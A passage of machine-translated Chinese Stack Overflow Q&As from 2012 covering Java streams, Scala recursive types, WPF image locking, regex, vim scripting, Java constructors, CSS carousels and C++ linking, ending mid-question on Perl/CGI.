如果我有一个需要 OutputStream（来自第三方库）的方法，以及另一个需要 InputStream（同样来自第三方库）的方法。将两者连接在一起的最佳做法是什么？基本上我需要某种对象来提供连接的 InputStream 和 OutputStream 。

我想到了一种使用 SynchronousQueue 的方法，但是必须将每个原始字节转换和取消转换为对象字节听起来不是一个好主意。

我宁愿不使用临时文件，而且缓冲整个 InputStream 是不可能的，因为数据可能非常大。

编辑：另外，如果可能的话，我想保持这个单线程。

这里的最佳做法是什么？

编辑：我需要澄清：我没有 InputStream 或 OutputStream，只有两种方法。一个期望 OutputStream 向其中写入数据，另一个期望 InputStream 从中读取数据。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-12T20:53:51.443

如果数据不是很大

```
ByteArrayOutputStream -> byte[] -> ByteArrayInputStream 
```

除此以外

```
PipedInputStream + PipedOutputStream 
```

这需要 2 个线程，因为 java 不支持“协程”

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-12T20:45:46.310

可以使用commons IOUtils的其中一种拷贝方法，即

```
static int  copy(InputStream input, OutputStream output) 
```

          将字节从 InputStream 复制到 OutputStream。

# scala - Scala 中带有列表的递归类型

> ID：12866785
> 
> 赞同：2
> 
> 时间：2012-10-12T20:41:20.310
> 
> 标签：scala, case-class, recursive-datastructures

[与 Scala 中的相互递归类型](https://stackoverflow.com/questions/11834928/mutually-recursive-types-in-scala)类似，我试图在 Scala 中创建一个相互递归类型。

我正在尝试制作一个用这种类型定义的图（它可以编译）：

```
 case class Node(val id : Int, val edges : Set[Node]) 
```

但我不明白如何用这种类型实际创建一些东西，因为为了用边 B 和 C 初始化节点 A，我至少需要对 B 和 C 有一个惰性引用，但我不能同时创建他们的边缘集。

是否可以实现这种递归类型？

编辑：

这是我目前用来将显式邻接列表转换为自引用列表的解决方案。

```
def mapToGraph(edgeMap : Map[Int, mutable.Set[Int]]) : List[Node] = {
  lazy val nodeMap = edgeMap map  (kv => (kv._1, new Node(kv._1, futures.get(kv._1).get)))
  lazy val futures : Map[Int, Set[Node]] = edgeMap map (kv => {
    val edges = (kv._2 map (e => nodeMap.get(e).get)).toSet
    (kv._1, edges)
  })
  val eval = nodeMap.values.toList
  eval //to force from lazy to real - don't really like doing this
} 
```

或者，来自一个边缘列表

```
//reads an edgeList into a graph
def readEdgelist(filename : String) : List[Node] = {
  lazy val nodes = new mutable.HashMap[Int, Node]()
  lazy val edges = new mutable.HashMap[Int, mutable.Buffer[Node]]()
  Source.fromFile(filename).getLines() filter (x => x != None) foreach {edgeStr =>
    val edge = edgeStr.split('\t')
    if (edge.size != 2) goodbye("Not a well-formed edge : " + edgeStr + " size: " + edge.size.toString)
    val src = edge(0).toInt
    val des = edge(1).toInt
    if (!(nodes.contains(src))) nodes.put(src, new Node(src, futures.get(src).get))
    if (!(nodes.contains(des))) nodes.put(des, new Node(des, futures.get(des).get))
    edges.put(src, edges.getOrElse(src, mutable.Buffer[Node]()) += nodes.get(des).get)
  }
  lazy val futures : Map[Int, Set[Node]] = nodes map {node => (node._1, edges.getOrElse(node._1, mutable.Buffer[Node]()).toSet)} toMap
  val eval = nodes.values.toList
  eval
} 
```

感谢大家的建议！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-12T21:09:48.393

鸡肉和鸡蛋……您有三个选择：

1.  将您的图限制为有向无环图 (DAG) 并使用 RKumsher 的建议。

2.  为了保持不变性，您需要将节点实例与边缘集（两个不同的类：创建节点，然后创建边缘集/图）分开。

3.  如果您更喜欢紧密相关，请考虑对边集使用设置器，以便您可以在创建所有节点后稍后返回并设置它们。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-12T20:51:37.990

听起来你需要自下而上地工作

```
val b = Node(1, Set.empty)
val c = Node(2, Set.empty)
val a = Node(3, Set(b, c)) 
```

希望有帮助

# charts - Microsoft Charting - 使 Y 轴始终可见

> ID：12866786
> 
> 赞同：2
> 
> 时间：2012-10-12T20:41:26.123
> 
> 标签：charts, data-visualization, mschart

我正在用 C# 创建一个 Microsoft 图表。它工作正常，但是当没有数据时 Y 轴消失。我希望 Y 轴始终可见。我试图找到一种方法来解决它，但我无法做到。

这是我的代码：

```
Chart chart = new Chart {
  AntiAliasing = AntiAliasingStyles.All,
  TextAntiAliasingQuality = TextAntiAliasingQuality.High,
  BackColor = Color.FromArgb(250, 250, 250),
  Height = size.Height,
  Width = size.Width
};

chart.Legends.Clear();

ChartArea area = new ChartArea {
  BackColor = Color.Transparent,
  BorderColor = Color.FromArgb(240, 240, 240),
  BorderWidth = 1,
  BorderDashStyle = ChartDashStyle.Solid,
  AxisX = new Axis {
    Enabled = AxisEnabled.True,
    IntervalAutoMode = IntervalAutoMode.VariableCount,
    IsLabelAutoFit = true,
    IsMarginVisible = true,
    LabelStyle = new LabelStyle { ForeColor = Color.FromArgb(100, 100, 100), Font = new Font("Arial", 10, FontStyle.Regular) },
    LineColor = Color.FromArgb(220, 220, 220),
    MajorGrid = new Grid { LineColor = Color.FromArgb(240, 240, 240), LineDashStyle = ChartDashStyle.Solid },
    MajorTickMark = new TickMark { LineColor = Color.FromArgb(220, 220, 220), Size = 4.0f },
  },
  AxisY = new Axis {
    Enabled = AxisEnabled.True,
    IntervalAutoMode = IntervalAutoMode.VariableCount,
    IsLabelAutoFit = true,
    IsMarginVisible = true,
    LabelStyle = new LabelStyle { ForeColor = Color.FromArgb(100, 100, 100), Font = new Font("Arial", 10, FontStyle.Regular) },
    LineColor = Color.Transparent,
    MajorGrid = new Grid { LineColor = Color.FromArgb(240, 240, 240), LineDashStyle = ChartDashStyle.Solid },
    MajorTickMark = new TickMark { LineColor = Color.FromArgb(240, 240, 240), Size = 2.0f }
  },
  Position = new ElementPosition { Height = 100, Width = 100, X = 0, Y = 0 }
};

chart.ChartAreas.Add(area);

area.AxisX.LabelStyle.Format = "H:mm";
area.AxisX.LabelStyle.IntervalType = DateTimeIntervalType.Hours;

Series series = new Series {
  CustomProperties = "PointWidth = 1",
  IsXValueIndexed = true,
  XValueType = (ChartValueType)Enum.Parse(typeof(ChartValueType), x.Data.GetType().GetGenericArguments()[0].Name)
};

series.BorderWidth = 2;
series.BorderColor = Color.FromArgb(84, 164, 232);
series.ChartType = SeriesChartType.Area;
series.Color = Color.FromArgb(222, 234, 244);

series.Points.DataBindXY(x.Data, s.Data);

chart.Series.Add(series); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T17:04:54.080

据我所知，这是不可能的。

作为解决方法，您可以添加另一个带有单个数据点的虚拟“线”系列。对于单个数据点，不会绘制线 - 但会显示轴。

# python - 区分由错误的函数参数触发和由函数体触发的 TypeError

> ID：12866788
> 
> 赞同：1
> 
> 时间：2012-10-12T20:41:34.577
> 
> 标签：python, exception-handling, typeerror

考虑

```
try:
    f(*args, **kwargs)
except TypeError:
    print "doh!" 
```

在这种情况下，原因`TypeError`可能是函数参数存在问题，例如`f() got an unexpected keyword argument 'b'`. 但是，`TypeError`也可能由于函数体本身的问题而引发，例如`list indices must be integers, not str`.

**我想知道 Python 2 中是否有可靠的方法来区分这两种情况（参数问题，正文问题）。**也许一些基于装饰器的方法？

推理：我正在实施另一种工作制度。工作基本上是一种功能。该函数的参数可以来自用户输入，并通过 JSON 序列化/反序列化过程。我希望系统向系统用户提供尽可能准确的错误消息。因此，我希望控制作业执行的实体能够区分`TypeError`. 此外，我认为这本身就是一个非常有趣的问题。

我意识到[https://stackoverflow.com/questions/12712475/how-to-check-if-a-typeerror-raised-from-mismatched-function-arguments](https://stackoverflow.com/questions/12712475/how-to-check-if-a-typeerror-raised-from-mismatched-function-arguments)基本上是这个问题的副本。然而，那里的评论讨论只是没有任何答案就停止了。我希望在这种情况下，可以打开我自己的问题并重新表述问题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-12T21:09:12.473

所以我不会这样做，因为您要向上传播的内部错误是编码错误，而不是需要捕获的实际异常。

话虽如此。我会反省抛出的错误，然后让一个错误并传播另一个。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-08-09T11:00:44.817

我很确定您可以通过以下方式解决此问题：

**步骤 1.**通过子类*化为体内 TypeError*创建一个自定义异常（例如`AwfulTypeError`）：*`Exception`*

 *```
class AwfulTypeError(Exception):
    pass  # Or do something if necessary 
```

**步骤 2.将***整个函数体*包装在一个`try`块中，并`except TypeError`为该块：

```
def my_function(a, b, c):
    try:
        # Some operations you need to do
        return (a + b) * c
    except TypeError as e:
        # We're doing stuff here in the next step 
```

**步骤 3.**在捕获原始`TypeError`异常时，将其重新引发为`AwfulTypeError`您之前指定的异常：

```
 except TypeError as e:
        raise AwfulTypeError(e) 
```

现在您可以将仍然是 a的*参数 TypeError*`TypeError`与现在是 type*的体内 TypeError*`AwfulTypeError`区分开来。

**PS**我更习惯*Python 3*，所以如果我弄乱了*Python 2*的语法，请随时通知我。*

# c# - 如何强制图像控件关闭它在 wpf 中打开的文件

> ID：12866793
> 
> 赞同：4
> 
> 时间：2012-10-12T20:41:49.653
> 
> 标签：c#, wpf, caliburn.micro

我的 wpf 页面上有一个图像，它从硬盘打开一个图像文件。用于定义图像的 XAML 是：

```
 <Image  Canvas.Left="65" Canvas.Top="5" Width="510" Height="255" Source="{Binding Path=ImageFileName}"  /> 
```

我正在使用 Caliburn Micro，并且 ImageFileName 更新为图像控件应显示的文件名。

当图像被图像控件打开时，我需要更改文件。但是该文件被图像控制锁定，我无法删除或复制任何法师。如何强制 Image 在打开文件后关闭文件，或者当我需要在其上复制另一个文件时？

我检查并没有用于图像的 CashOptio，所以我不能使用它。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-10-12T21:21:56.773

您可以使用如下所示的[绑定转换器，通过设置](http://msdn.microsoft.com/en-us/library/system.windows.data.binding.converter.aspx)[BitmapCacheOption.OnLoad](http://msdn.microsoft.com/en-us/library/system.windows.media.imaging.bitmapcacheoption.aspx)将图像直接加载到内存缓存。该文件会立即加载，之后不会锁定。

```
<Image Source="{Binding ...,
                Converter={StaticResource local:StringToImageConverter}}"/> 
```

转换器：

```
public class StringToImageConverter : IValueConverter
{
    public object Convert(
        object value, Type targetType, object parameter, CultureInfo culture)
    {
        object result = null;
        var path = value as string;

        if (!string.IsNullOrEmpty(path))
        {
            var image = new BitmapImage();
            image.BeginInit();
            image.CacheOption = BitmapCacheOption.OnLoad;
            image.UriSource = new Uri(path);
            image.EndInit();
            result = image;
        }

        return result;
    }

    public object ConvertBack(object value, Type targetType, object parameter, CultureInfo culture)
    {
        throw new NotSupportedException();
    }
} 
```

更好的是，直接从 FileStream 加载 BitmapImage：

```
public object Convert(
    object value, Type targetType, object parameter, CultureInfo culture)
{
    object result = null;
    var path = value as string;

    if (!string.IsNullOrEmpty(path) && File.Exists(path))
    {
        using (var stream = File.OpenRead(path))
        {
            var image = new BitmapImage();
            image.BeginInit();
            image.CacheOption = BitmapCacheOption.OnLoad;
            image.StreamSource = stream;
            image.EndInit();
            result = image;
        }
    }

    return result;
} 
```

# ios - MailCore 的 Shell 脚本调用错误

> ID：12866805
> 
> 赞同：3
> 
> 时间：2012-10-12T20:42:25.413
> 
> 标签：ios, xcode, mailcore

我正在尝试在应用程序中使用 MailCore，我从 Github 获得了该项目，并按照[http://libmailcore.com/](http://libmailcore.com/)上的说明进行操作。

一切似乎都正确导入，但是当我尝试构建项目时，我得到了包含 cyrus-sasl 和 openssl 项目的 Shell Script Invocation Error Can't exec '/usr/bin/make' (No such file or directory)在 MailCore 中。任何建议将不胜感激。谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-15T21:43:45.700

我弄清楚它是什么，我必须在以下位置启用命令行工具：XCode > Preferences > Downloads > Components > command line tools。

此外，它没有在 MailCore 教程中列出，但是为了在终端中获得 git 支持，我找到了这个网站进行演练 [http://vandadnp.wordpress.com/2012/04/06/git-from-command-line-after-安装-xcode-on-os-x-lion/](http://vandadnp.wordpress.com/2012/04/06/git-from-command-line-after-installing-xcode-on-os-x-lion/)

# html - vim 如何将 :substitute 命令转移到脚本

> ID：12866806
> 
> 赞同：1
> 
> 时间：2012-10-12T20:42:26.517
> 
> 标签：html, vim

这里有 2 个 :s 命令。在命令行或作为键映射的一部分工作正常，但我无法让它们在 vim 脚本中正确运行。我已经使用了正常，执行，执行“正常...”并对其调用正常。我已经将范围与 s 放在一起，并且在正常之前，我已经在 s 之前尝试了带和不带 : 的范围。我应该如何在 .vim 文件中编写它们？

```
:%s/<[\/]\?SPAN\|DIV\|OPTION[^>]*>//gi
:%s/<\(hr\|h[1-6]\|ul\|li\|p\|tt\|ol\|table\|tr\|td\|p\) [^>]\+/<\1/gi 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-12T21:03:25.850

您可以将像您的 Ex 命令放入`myscript.vim`文件中，然后通过执行命令

```
:source myscript.vim 
```

这应该无需修改即可工作（您不需要前导`:`，但它不会受到伤害）。我没有看到任何问题，`:execute`除非您想包含变量，否则您不需要。`:normal`用于普通模式命令（例如`diw`，例如）。

通常，您会将这些自定义命令放入一个函数中（将放在`~/.vimrc`or中），然后通过直接、通过映射或自定义命令`~/.vim/plugin/myscript.vim`调用它。`:call`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-12T21:03:39.293

您应该将它们添加到脚本中。在这种情况下，您不必为它们添加任何前缀。

# regex - 正则表达式删除字符串中某个点之前的字符

> ID：12866808
> 
> 赞同：1
> 
> 时间：2012-10-12T20:42:33.423
> 
> 标签：regex

如何使用正则表达式进行转换

```
11111aA$xx1111xxdj$%%` 
```

到

```
aA$xx1111xxdj$%% 
```

所以，换句话说，我想删除（或匹配）第一个`1`'s 分组。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-12T20:44:20.663

根据语言，您应该有办法用正则表达式替换字符串。在 Java 中，您可以这样做：

```
String s = "11111aA$xx1111xxdj$%%";
String res = s.replaceAll("^1+", ""); 
```

“ `^`anchor”表示必须匹配输入的开头。`1+`表示一个或多个`1`字符的序列。

这是[ideone](http://ideone.com/MhsdN)与这个正在运行的程序的链接。

C# 中的相同程序：

```
var rx = new Regex("^1+");
var s = "11111aA$xx1111xxdj$%%";
var res = rx.Replace(s, "");
Console.WriteLine(res); 
```

（[链接到ideone](http://ideone.com/fGilt)）

一般来说，如果您只想在字符串的开头匹配任何内容，`^`请在表达式中添加前缀；同样，`$`在末尾添加 a 会使匹配只接受输入末尾的字符串。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-12T20:45:31.670

如果这是开始，你可以使用这个：

```
^[1]* 
```

至于替换，这取决于语言。在powershell中，我会这样做：

```
[regex]::Replace("11111aA$xx1111xxdj$%%","^[1]*","") 
```

这将返回：

```
aA$xx1111xxdj$%% 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-12T20:45:17.810

如果您只想替换字符串开头的连续“1”，请将以下内容替换为空字符串：

```
^1+ 
```

如果连续的“1”不一定是字符串中的第一个字符（但您仍然只想替换一个组），请将以下内容替换为第一个捕获组的内容（通常是`\1`or `$1`）：

```
1+(.*) 
```

请注意，仅当您只有“全部替换”功能可用时才需要这样做，但是大多数正则表达式实现还提供了一种仅替换匹配实例的方法，在这种情况下，您可以只替换`1+`为空字符串。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-12T20:58:17.823

我不确定，但你可以试试这个 `[^1](\w*\d*\W)*`- 除了开始“1”（n）个符号外，将所有匹配作为一个组

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-02-15T11:36:04.880

在 Javascript 中

```
 var str  = '11111aA$xx1111xxdj$%%';
    var patt = /^1+/g;
    str      =  str.replace(patt,""); 
```

# java - 为什么我们在读取数据时不需要使用 try-catch 块，但在将 Scanner 附加到文件时却需要 try-catch？

> ID：12866811
> 
> 赞同：0
> 
> 时间：2012-10-12T20:42:43.990
> 
> 标签：java

我正在阅读一本关于 The Scanner 的编程书，它说我们在读取数据时不需要使用 try-catch 块，因为捕获了 IOException，但是在将 Scanner 附加到文件时我们确实需要 try-catch。

例如，在下面的代码中需要 try-catch。你能告诉我一个不需要try-catch但错误被IOException捕获的例子吗？

```
Scanner scnaFile = null;
String fileName = "dataFile.txt";
try{
    scanFile = new Scanner(new File(fileName));
} catch (FileNotFoundException ex){
     System.err.println(filename + " not found");
     System.exit(1);
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-12T20:51:02.090

> 你能告诉我一个不需要try-catch但错误被IOException捕获的例子吗？

例子：

```
Scanner sc = new Scanner(new File("myNumbers"));  
while (sc.hasNextLong()) {  
   long aLong = sc.nextLong();  
} 
```

这些`nextXXX`方法不会抛出任何与 I/O 相关的异常，因为这是在代码中捕获的。
如果输入耗尽，它们会抛出异常。
阅读[扫描仪 Javadoc](http://docs.oracle.com/javase/7/docs/api/java/util/Scanner.html)

# java - 为什么映射节点会得到 java.lang.RuntimeException？

> ID：12866816
> 
> 赞同：2
> 
> 时间：2012-10-12T20:43:01.443
> 
> 标签：java, exception, ibm-integration-bus

我正在使用 Message Broker 8 和 MQ 7。当我尝试在我的消息流中使用映射节点时，我得到一个 java.lang.RuntimeException。

以下是事件查看器显示的内容：

```
( BROKER8.default ) The map script generation for QName ''{practica}:CambioFecha'' has failed, with the following details: ''java.lang.RuntimeException: ''.   

The generation of the map has failed.   

Review and resolve the problems indicated in the message from the map generation. 
```

完整的异常堆栈是：

```
 ExceptionList: ( ['MQROOT' : 0xe052600]
      (0x01000000:Name):RecoverableException = (
        (0x03000000:NameValue):File                 = 'F:\build\S000_P\src\DataFlowEngine\PluginInterface\ImbJniNode.cpp' (CHARACTER)
        (0x03000000:NameValue):Line                 = 1170 (INTEGER)
        (0x03000000:NameValue):Function             = 'ImbJniNode::evaluate' (CHARACTER)
        (0x03000000:NameValue):Type                 = 'ComIbmMSLMappingNode' (CHARACTER)
        (0x03000000:NameValue):Name                 = 'practica/DATAGRAMA#FCMComposite_1_7' (CHARACTER)
        (0x03000000:NameValue):Label                = 'practica.DATAGRAMA.Cambio Formato Fecha' (CHARACTER)
        (0x03000000:NameValue):Catalog              = 'BIPmsgs' (CHARACTER)
        (0x03000000:NameValue):Severity             = 3 (INTEGER)
        (0x03000000:NameValue):Number               = 2230 (INTEGER)
        (0x03000000:NameValue):Text                 = 'Caught exception and rethrowing' (CHARACTER)
        (0x01000000:Name     ):RecoverableException = (
          (0x03000000:NameValue):File                 = 'MbErrorHandler.java' (CHARACTER)
          (0x03000000:NameValue):Line                 = 146 (INTEGER)
          (0x03000000:NameValue):Function             = 'evaluate' (CHARACTER)
          (0x03000000:NameValue):Type                 = '' (CHARACTER)
          (0x03000000:NameValue):Name                 = '' (CHARACTER)
          (0x03000000:NameValue):Label                = '' (CHARACTER)
          (0x03000000:NameValue):Catalog              = 'BIPmsgs' (CHARACTER)
          (0x03000000:NameValue):Severity             = 3 (INTEGER)
          (0x03000000:NameValue):Number               = 3946 (INTEGER)
          (0x03000000:NameValue):Text                 = 'Caught BrokerXCIStaticException' (CHARACTER)
          (0x01000000:Name     ):Insert               = (
            (0x03000000:NameValue):Type = 5 (INTEGER)
            (0x03000000:NameValue):Text = '{practica}:CambioFecha' (CHARACTER)
          )
          (0x01000000:Name     ):Insert               = (
            (0x03000000:NameValue):Type = 5 (INTEGER)
            (0x03000000:NameValue):Text = 'java.lang.RuntimeException: ' (CHARACTER)
          )
          (0x01000000:Name     ):RecoverableException = (
            (0x03000000:NameValue):File     = 'MbErrorHandler.java' (CHARACTER)
            (0x03000000:NameValue):Line     = 310 (INTEGER)
            (0x03000000:NameValue):Function = 'throwableToMbException' (CHARACTER)
            (0x03000000:NameValue):Type     = '' (CHARACTER)
            (0x03000000:NameValue):Name     = '' (CHARACTER)
            (0x03000000:NameValue):Label    = '' (CHARACTER)
            (0x03000000:NameValue):Catalog  = 'BIPmsgs' (CHARACTER)
            (0x03000000:NameValue):Severity = 3 (INTEGER)
            (0x03000000:NameValue):Number   = 3949 (INTEGER)
            (0x03000000:NameValue):Text     = 'Caught BrokerXCIStaticException' (CHARACTER)
            (0x01000000:Name     ):Insert   = (
              (0x03000000:NameValue):Type = 5 (INTEGER)
              (0x03000000:NameValue):Text = 'java.lang.RuntimeException: 

    ' (CHARACTER)
            )
          )
        )
      )
    ) 
```

整个消息流运行良好。所以，我认为这不是映射节点的错误。另一个细节，在其他流程中，映射节点根本不起作用并给出相同的错误。我不知道可能是什么问题。也许是 JRE 错误？

任何想法？

谢谢！

若苏埃

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-22T15:16:24.983

这很可能是由于 64 位机器上的 Java 堆大小较大，因为所有引用都大了 4 个字节。要使其工作，您可以简单地在 32 位代理上运行它或尝试以下任何一种方法 -

1.  使用 Xcompressedrefs （关于它的解释在这里 -

[http://publib.boulder.ibm.com/infocenter/javasdk/v6r0/index.jsp?topic=%2Fcom.ibm.java.doc.diagnostics.60%2Fdiag%2Funderstanding%2Fmm_compressed_references.html](http://publib.boulder.ibm.com/infocenter/javasdk/v6r0/index.jsp?topic=%2Fcom.ibm.java.doc.diagnostics.60%2Fdiag%2Funderstanding%2Fmm_compressed_references.html) )

a) 在代理提示符下执行以下命令

> mqsichangeproperties --broker 名称-- -e --EG 名称-- -o ComIbmJVMManager -n jvmSystemProperty -v \"-Xcompressedrefs\"

b) 验证 JVM 选项是否成功应用

> mqsireportproperties --broker name-- -e --EG name-- -o ComIbmJVMManager -n jvmSystemProperty

系统应显示 -

-Xcompressedrefs

c) 重启执行组

1.  增加 JVM 内存，默认为 256MB a) 执行以下命令

> mqsichangeproperties --broker name-- -e --EG name-- -o ComIbmJVMManager -n jvmMaxHeapSize -v 536870912

b) 验证 JVM 选项是否成功应用

> mqsireportproperties --broker 名称-- -e --EG 名称-- -o ComIbmJVMManager -n jvmMaxHeapSize

c) 重启执行组

希望这可以帮助

# constructor - 扩展构造函数类时，如何从类中调用构造函数？

> ID：12866818
> 
> 赞同：1
> 
> 时间：2012-10-12T20:43:06.890
> 
> 标签：constructor

所以我在构造函数时遇到了麻烦。我正在将我的 Tile 类中的构造函数调用到我的 Square 类中，并且构造函数应该没有参数。

```
 import java.awt.*;
    import java.awt.event.*;
    import java.awt.image.*;
    import java.io.*;
    import javax.imageio.*;
    import javax.swing.*;

    public class Square extends Tile
    {
        static BufferedImage square = null;

        public void Square()
        {
            try
            {
               square = ImageIO.read(new File("BlueSquare.png"));
            }
            catch (IOException e){}
        }

        public Square(int dVal, boolean walk, BufferedImage image)
        {
            super(1, true, square);
        }
    } 
```

这是瓷砖类。

```
 import java.awt.*;
    import java.awt.event.*;
    import java.awt.image.*;
    import java.io.*;
    import javax.imageio.*;
    import javax.swing.*;

    public class Tile
    {
        static int dataVal;
        static boolean walkable;
        static BufferedImage img;

        public void Tile (int dVal, boolean walk, BufferedImage image)
        {
            dataVal = dVal;
            walkable = walk;
            img = image;
        }

        public static int getValue()
        {
            return dataVal;
        }

        public static boolean getWalk()
        {
            return walkable;
        }

        public static BufferedImage getImage()
        {
            return img;
        }
    } 
```

我究竟做错了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-12T20:45:29.187

`public void Square()`不是*构造*函数；这只是一种具有糟糕命名约定的方法。

`public Square()` *是*一个带有三个参数的构造函数。它调用`Tile`构造函数，该构造函数也有三个参数。

删除`void`：

```
public void Tile (int dVal, boolean walk, BufferedImage image) 
```

应该：

```
public Tile (int dVal, boolean walk, BufferedImage image) 
```

您的方法名称令人发指。难怪你会感到困惑。将这些方法名称更改为以小写字母开头且不使用类名的名称（例如“createSquareImage”）。

阅读 Sun Java 编码约定。你需要了解他们。

# ios-provisioning - 配置文件

> ID：12866819
> 
> 赞同：1
> 
> 时间：2012-10-12T20:43:09.027
> 
> 标签：ios-provisioning, provisioning-profile, organizer

我现在有一部 iPhone 5，我想用于开发。我尝试在 Organizer 中添加配置文件，但它们是灰色的。不能在多个设备上使用相同的配置文件吗？

当我在管理器中为新设备选择了配置文件时，我单击左下角的 + 符号以添加配置文件。我导航到配置文件的正确位置，正如我上面提到的，它们是灰色的。没有办法以这种方式添加它。

琳达

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-01-12T06:24:45.747

Linda，可以在多个设备上使用相同的配置文件。

在您的情况下，配置文件变灰的可能性可能是因为：

*   您正在使用的设备未在您尝试的配置文件下注册。

配置文件绑定

*   证书
*   应用编号
*   设备的 UDID。

以上4个绑定并一起工作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-22T07:36:32.070

在 Xcode 管理器中选择设备后，您可以找到“添加到门户”选项。然后使用您有效的苹果开发者帐户登录。然后一切都会自动配置。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-04-28T10:50:20.177

配置文件可以用于多个设备。

您的情况是因为在您的配置文件中不包括您的 iPhone 5 (UDID)。

1.  请检查[https://developer.apple.com/](https://developer.apple.com/)
2.  添加您的 UDID
3.  创建新的配置文件
4.  将您的配置文件添加到 XCode
5.  签到组织者

# javascript - 轮播中图像之间的淡入淡出

> ID：12866821
> 
> 赞同：1
> 
> 时间：2012-10-12T20:43:33.690
> 
> 标签：javascript, css, css-transitions

我一直在试图理解为什么我的轮播不会在转换之间褪色。它按预期循环，但似乎没有应用过渡效果来使一个面板淡入到下一个面板。

这是我到目前为止所拥有的：

```
/* Javascript */
function cycle() {
    var active = $('.carousel .item.active');
    var panels = $('.carousel .item');
    var pos = panels.index(active);
    var next = panels.eq((pos >= 5) ? 0 : ++pos);

    next.addClass('active');
    active.removeClass('active');
}

var interval = setInterval(cycle, 2000);

/* CSS */
.carousel-inner {
    position: relative;
    width: 100%;
    overflow: hidden;
}
.carousel .item {
    -webkit-transition: opacity 0.6s ease-in-out;
    -moz-transition: opacity 0.6s ease-in-out;
    -o-transition: opacity 0.6s ease-in-out;
    transition: opacity 0.6s ease-in-out;
    opacity: 0;
}
.carousel .item.active {
    opacity: 1;
}

/* HTML */
<div id="id_landing_carousel" class="carousel slide">
    <div class="carousel-inner">
        <div class="item" data-nav-button="nav-home">
            <img src="/media/carousel/home.png">
            <div class="carousel-caption">
                <h4><p>Welcome</p></h4>
            </div>
        </div>
        <div class="item" data-nav-button="nav-residential">
            <img src="/media/carousel/residential.jpg">
            <div class="carousel-caption">
                <h4><p>Residential</p></h4>
            </div>
        </div>
        <div class="item" data-nav-button="nav-commercial">
            <img src="/media/carousel/commercial.jpg">
            <div class="carousel-caption">
                <h4><p>Commercial</p></h4>
            </div>
        </div>
        <div class="item" data-nav-button="nav-service">
            <img src="/media/carousel/service.jpg">
            <div class="carousel-caption">
                <h4><p>Service</p></h4>
            </div>
        </div>
        <div class="item active" data-nav-button="nav-blog">
            <img src="/media/carousel/blog.jpg">
            <div class="carousel-caption">
                <h4><p>Blog</p></h4>
            </div>
        </div>
        <div class="item" data-nav-button="nav-contact">
            <img src="/media/carousel/contact.jpg">
            <div class="carousel-caption">
                <h4><p>Contact us</p></h4>
            </div>
        </div>
    </div>
</div> 
```

如果有人对我做错了什么有任何见解，我将非常感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-12T21:19:49.863

该死。没关系。自己解决了。另一种风格是将轮播的 div 元素设置为 display: none 当它不是时`active`。

# c++ - Eclipse 处理多个项目

> ID：12866825
> 
> 赞同：1
> 
> 时间：2012-10-12T20:43:45.453
> 
> 标签：c++, eclipse, multiple-projects

我有两个用 C++ 编写的项目。假设项目被命名为 first 和 second，第一个是基础项目，第二个项目有第一个项目的插件，所以当我构建和安装第二个项目时，它只是添加了第一个项目的功能。

我创建了两个单独的 Makefile 项目“第一个”和“第二个”，我可以分别构建它们。

我的问题是我无法将“第一个”中生成的二进制文件链接为“第二个”的基本二进制文件。我尝试在 stackoverflow 上搜索类似的问题，但我不知道如何将“第一”中生成的二进制文件链接到“第二”，任何帮助将不胜感激。

让我知道是否需要重新提出我的问题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-12T20:53:54.227

如果您使用的是 GCC，并阅读[链接器选项的参考，](http://gcc.gnu.org/onlinedocs/gcc-4.7.2/gcc/Link-Options.html#Link-Options)您会注意到与外部库链接的选项：

*   `-L<directory>`

    此选项告诉链接器添加`<directory>`到库搜索路径。换句话说，它告诉链接器在哪里可以找到库文件。

*   `-l<name-of-lib>`

    此选项告诉链接器与库链接。POSIX 环境（Linux、OSX、使用 Cygwin 或 MinGW 的 Windows）中的库被命名为`libname-of-lib.a`，但`-l`您不需要使用`lib`前缀或`.a`扩展名。另请注意，在 option`-l`中，即小写字母 L（不是大写 i 或数字 1）。

总结：要与另一个目录中的库链接，您可以这样链接：

```
$ gcc <other flags> <object files> -o <executable> -L<directory> -l<library> 
```

在您的情况下，您应该为`-L`选项指定库所在的目录`project1`，并为`-l`选项传递库的基本名称。

* * *

另一方面，如果你不`project1`变成一个库，并且想直接链接它的目标文件，那也很好：

```
$ gcc <flags> <object files of project1> <object files of project2> -o <executable> 
```

目标文件当然可以是完整路径或相对路径。例如，如果您具有以下目录结构：

```
/
`--家
    `-- 用户
        `-- 我的项目
            |-- 项目1
            `--项目2

```

然后，如果您在目录中，则可以`project2`从以下位置访问目标文件`project1`

```
../project1/objectfile.o 
```

* * *

当然，所有这些都可以放在 Makefile 中。

# perl - 从另一个 Perl/CGI 脚本向 Perl/CGI 脚本传递参数时出现奇怪的行为

> ID：12866826
> 
> 赞同：0
> 
> 时间：2012-10-12T20:43:50.630
> 
> 标签：perl, cgi

对于工作中的项目，我需要从另一个调用一个 Perl/CGI 脚本。我用于测试的那个脚本的一个极其简化的版本在这里（真正的脚本不使用递归，但这样我就不必复制和粘贴很多代码）：

```
#!/usr/local/bin/perl
use CGI qw(:standard);
use POSIX 'setsid';
$|=1;

